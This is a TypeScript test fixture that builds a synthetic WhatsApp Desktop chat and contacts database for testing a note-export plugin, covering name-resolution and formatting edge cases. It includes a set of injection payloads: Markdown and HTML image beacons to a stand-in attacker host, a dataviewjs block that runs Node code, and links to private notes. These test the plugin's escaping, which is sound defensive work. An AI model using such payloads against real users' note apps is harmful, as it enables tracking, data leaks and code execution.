// Builds a SYNTHETIC WhatsApp Desktop store (ChatStorage.sqlite + ContactsV2.sqlite)
// with only the tables/columns the plugin reads. No real data is ever used in
// tests. Edge cases covered: @lid senders resolved through each name source,
// opaque push-names, same-second messages, media rows (NULL text), status
// broadcast, a chat with no partner name, special characters in chat names,
// multi-line text and Markdown/HTML injection payloads.

import { mkdtempSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";

import { TestDb } from "./sqlite";

const MAC_EPOCH_MS = Date.UTC(2001, 0, 1);
/** ISO-8601 UTC instant → Mac absolute time (seconds since 2001-01-01Z). */
export function mac(iso: string): number {
	return (Date.parse(iso) - MAC_EPOCH_MS) / 1000;
}

// --- JIDs -----------------------------------------------------------------

export const JID = {
	alice: "5511999990001@s.whatsapp.net", // personal, saved in the address book
	unsaved: "5511999990005@s.whatsapp.net", // personal, no partner name, not saved
	falcon: "120363000000000001@g.us", // group
	special: "120363000000000002@g.us", // group with characters illegal in file names
	injection: "120363000000000003@g.us", // group carrying A1 payloads
	status: "status@broadcast", // must be skipped
	// group members
	bruno: "111111111111111@lid", // saved contact (name wins over push-name)
	carla: "222222222222222@lid", // push-name only
	phoneOnly: "5511988887777@s.whatsapp.net", // phone JID, no name anywhere
	unknown: "333333333333333@lid", // nothing known → Member-<hash>
	opaque: "444444444444444@lid", // opaque base64 push-name → ignored → Member-<hash>
	bridged: "555555555555555@lid", // saved contact with phone but no name → +phone
} as const;

// --- Rows -----------------------------------------------------------------

export interface ChatRow {
	zPk: number;
	jid: string;
	partnerName: string | null;
	archived?: number;
}

export interface MemberRow {
	zPk: number;
	jid: string;
	chat: number;
}

export interface MessageRow {
	zPk: number;
	chat: number;
	member?: number | null;
	fromJid?: string | null;
	text: string | null;
	at: string; // ISO UTC
	isFromMe?: boolean;
}

export const CHATS: ChatRow[] = [
	{ zPk: 1, jid: JID.alice, partnerName: "Alice Souza" },
	{ zPk: 2, jid: JID.falcon, partnerName: "Projeto Falcon" },
	{ zPk: 3, jid: JID.special, partnerName: 'Projeto: "Falcon" / Q4 #1 [beta]' },
	{ zPk: 4, jid: JID.status, partnerName: null },
	{ zPk: 5, jid: JID.unsaved, partnerName: null },
	{ zPk: 6, jid: JID.injection, partnerName: "Injeção" },
];

export const MEMBERS: MemberRow[] = [
	{ zPk: 1, jid: JID.bruno, chat: 2 },
	{ zPk: 2, jid: JID.carla, chat: 2 },
	{ zPk: 3, jid: JID.phoneOnly, chat: 2 },
	{ zPk: 4, jid: JID.unknown, chat: 2 },
	{ zPk: 5, jid: JID.opaque, chat: 2 },
	{ zPk: 6, jid: JID.bridged, chat: 2 },
	{ zPk: 7, jid: JID.unknown, chat: 6 },
	{ zPk: 8, jid: JID.bruno, chat: 3 },
];

export const INJECTION_PAYLOADS = {
	remoteImage: "olha isso ![](https://atacante.exemplo/p.png?id=vitima)",
	dataviewjs: "inofensivo\n```dataviewjs\ndv.paragraph(require('os').userInfo().username)\n```",
	links: "veja [[Senhas]] e ![[Diario privado]] #urgente chave:: valor",
	html: '<img src="https://atacante.exemplo/x.gif">',
	unclosedFence: "abrindo bloco sem fechar\n```",
} as const;

// Times are UTC; in America/Sao_Paulo (UTC-3) 12:00Z renders as 09:00.
export const MESSAGES: MessageRow[] = [
	// Personal — saved contact. Incoming rows carry the partner's JID in ZFROMJID.
	{ zPk: 10, chat: 1, fromJid: JID.alice, text: "Oi! Tudo bem?", at: "2026-03-10T12:00:00Z" },
	{ zPk: 11, chat: 1, isFromMe: true, text: "Tudo ótimo, e você?", at: "2026-03-10T12:01:00Z" },
	{ zPk: 12, chat: 1, fromJid: JID.alice, text: "Mensagem no mesmo segundo", at: "2026-03-10T12:01:00Z" },
	{ zPk: 13, chat: 1, fromJid: JID.alice, text: null, at: "2026-03-10T12:02:00Z" }, // media → skipped
	{ zPk: 14, chat: 1, fromJid: JID.alice, text: "Quase meia-noite (local)", at: "2026-03-11T02:30:00Z" },
	{ zPk: 15, chat: 1, fromJid: JID.alice, text: "Bom dia", at: "2026-03-11T11:30:00Z" },

	// Group — one sender per name-resolution path.
	{ zPk: 20, chat: 2, member: 1, fromJid: JID.falcon, text: "Contato salvo (Bruno)", at: "2026-03-10T13:00:00Z" },
	{ zPk: 21, chat: 2, member: 2, fromJid: JID.falcon, text: "Só push-name (Carla)", at: "2026-03-10T13:01:00Z" },
	{ zPk: 22, chat: 2, member: 3, fromJid: JID.falcon, text: "Só telefone", at: "2026-03-10T13:02:00Z" },
	{ zPk: 23, chat: 2, member: 4, fromJid: JID.falcon, text: "LID desconhecido", at: "2026-03-10T13:03:00Z" },
	{ zPk: 24, chat: 2, member: 5, fromJid: JID.falcon, text: "Push-name opaco", at: "2026-03-10T13:04:00Z" },
	{ zPk: 25, chat: 2, member: 6, fromJid: JID.falcon, text: "Ponte LID → telefone", at: "2026-03-10T13:05:00Z" },
	{ zPk: 26, chat: 2, isFromMe: true, text: "Linha 1\nLinha 2", at: "2026-03-10T13:06:00Z" },

	// Group whose name has characters illegal in file names / YAML.
	{ zPk: 30, chat: 3, member: 8, fromJid: JID.special, text: "Nome com caracteres especiais", at: "2026-03-10T14:00:00Z" },

	// Status broadcast → never written.
	{ zPk: 40, chat: 4, fromJid: JID.alice, text: "Status de alguém", at: "2026-03-10T15:00:00Z" },

	// Personal, no partner name, not saved → chat titled by JID.
	{ zPk: 50, chat: 5, fromJid: JID.unsaved, text: "Oi, sou um número não salvo", at: "2026-03-10T16:00:00Z" },

	// Injection payloads sent by a stranger in a group.
	{ zPk: 60, chat: 6, member: 7, fromJid: JID.injection, text: INJECTION_PAYLOADS.remoteImage, at: "2026-03-10T17:00:00Z" },
	{ zPk: 61, chat: 6, member: 7, fromJid: JID.injection, text: INJECTION_PAYLOADS.dataviewjs, at: "2026-03-10T17:01:00Z" },
	{ zPk: 62, chat: 6, member: 7, fromJid: JID.injection, text: INJECTION_PAYLOADS.links, at: "2026-03-10T17:02:00Z" },
	{ zPk: 63, chat: 6, member: 7, fromJid: JID.injection, text: INJECTION_PAYLOADS.html, at: "2026-03-10T17:03:00Z" },
	{ zPk: 64, chat: 6, member: 7, fromJid: JID.injection, text: INJECTION_PAYLOADS.unclosedFence, at: "2026-03-10T17:04:00Z" },
];

const CHAT_SCHEMA = `
CREATE TABLE ZWACHATSESSION (Z_PK INTEGER PRIMARY KEY, ZCONTACTJID VARCHAR, ZPARTNERNAME VARCHAR, ZARCHIVED INTEGER DEFAULT 0, ZREMOVED INTEGER DEFAULT 0, ZLASTMESSAGEDATE TIMESTAMP);
CREATE TABLE ZWAGROUPMEMBER (Z_PK INTEGER PRIMARY KEY, ZMEMBERJID VARCHAR, ZCHATSESSION INTEGER, ZCONTACTNAME VARCHAR, ZFIRSTNAME VARCHAR);
CREATE TABLE ZWAMESSAGE (Z_PK INTEGER PRIMARY KEY, ZCHATSESSION INTEGER, ZGROUPMEMBER INTEGER, ZFROMJID VARCHAR, ZTEXT VARCHAR, ZMESSAGEDATE TIMESTAMP, ZISFROMME INTEGER, ZMESSAGETYPE INTEGER DEFAULT 0, ZMEDIAITEM INTEGER);
CREATE TABLE ZWAMEDIAITEM (Z_PK INTEGER PRIMARY KEY, ZMESSAGE INTEGER, ZTITLE VARCHAR, ZMOVIEDURATION INTEGER, ZVCARDNAME VARCHAR, ZLATITUDE FLOAT, ZLONGITUDE FLOAT, ZMEDIALOCALPATH VARCHAR);
CREATE TABLE ZWAPROFILEPUSHNAME (Z_PK INTEGER PRIMARY KEY, ZJID VARCHAR, ZPUSHNAME VARCHAR);
`;

const CONTACTS_SCHEMA = `
CREATE TABLE ZWAADDRESSBOOKCONTACT (Z_PK INTEGER PRIMARY KEY, ZLID VARCHAR, ZWHATSAPPID VARCHAR, ZPHONENUMBER VARCHAR, ZFULLNAME VARCHAR, ZGIVENNAME VARCHAR, ZBUSINESSNAME VARCHAR);
`;

export interface FixturePaths {
	dir: string;
	chatStorage: string;
	contacts: string;
}

/** Write a fresh ChatStorage.sqlite + ContactsV2.sqlite pair into a new temp dir. */
export function buildFixture(opts: { withContacts?: boolean } = {}): Promise<FixturePaths> {
	const dir = mkdtempSync(join(tmpdir(), "wa-fixture-"));
	const chatStorage = join(dir, "ChatStorage.sqlite");
	const contacts = join(dir, "ContactsV2.sqlite");

	const db = new TestDb(chatStorage);
	db.exec(CHAT_SCHEMA);
	for (const c of CHATS) {
		db.run("INSERT INTO ZWACHATSESSION (Z_PK, ZCONTACTJID, ZPARTNERNAME, ZARCHIVED) VALUES (?, ?, ?, ?)", [
			c.zPk,
			c.jid,
			c.partnerName,
			c.archived ?? 0,
		]);
	}
	for (const m of MEMBERS) {
		db.run("INSERT INTO ZWAGROUPMEMBER (Z_PK, ZMEMBERJID, ZCHATSESSION) VALUES (?, ?, ?)", [m.zPk, m.jid, m.chat]);
	}
	for (const [jid, name] of [
		[JID.carla, "Carla ⚡"],
		[JID.opaque, "QUJDREVGR0hJSktMTU5PUA=="],
		[JID.bruno, "Bruninho"], // overridden by the saved contact name
	] as const) {
		db.run("INSERT INTO ZWAPROFILEPUSHNAME (ZJID, ZPUSHNAME) VALUES (?, ?)", [jid, name]);
	}
	insertMessages(db, MESSAGES);
	db.close();

	if (opts.withContacts !== false) {
		const cdb = new TestDb(contacts);
		cdb.exec(CONTACTS_SCHEMA);
		const rows: (string | null)[][] = [
			[JID.bruno, "5511977776666@s.whatsapp.net", "+55 11 97777-6666", "Bruno Lima", "Bruno", null],
			[null, JID.alice, "5511999990001", "Alice Souza (agenda)", "Alice", null],
			[JID.bridged, null, "5511966665555", null, null, null],
		];
		for (const r of rows) {
			cdb.run(
				"INSERT INTO ZWAADDRESSBOOKCONTACT (ZLID, ZWHATSAPPID, ZPHONENUMBER, ZFULLNAME, ZGIVENNAME, ZBUSINESSNAME) VALUES (?, ?, ?, ?, ?, ?)",
				r,
			);
		}
		cdb.close();
	}

	return Promise.resolve({ dir, chatStorage, contacts });
}

function insertMessages(db: TestDb, rows: MessageRow[]): void {
	for (const m of rows) {
		db.run(
			"INSERT INTO ZWAMESSAGE (Z_PK, ZCHATSESSION, ZGROUPMEMBER, ZFROMJID, ZTEXT, ZMESSAGEDATE, ZISFROMME) VALUES (?, ?, ?, ?, ?, ?, ?)",
			[m.zPk, m.chat, m.member ?? null, m.isFromMe ? null : (m.fromJid ?? null), m.text, mac(m.at), m.isFromMe ? 1 : 0],
		);
	}
}

/** Simulate WhatsApp activity between syncs: run statements and/or append messages. */
export function mutateChatStorage(path: string, change: { sql?: string[]; messages?: MessageRow[] }): Promise<void> {
	const db = new TestDb(path);
	for (const s of change.sql ?? []) db.run(s);
	if (change.messages) insertMessages(db, change.messages);
	db.close();
	return Promise.resolve();
}
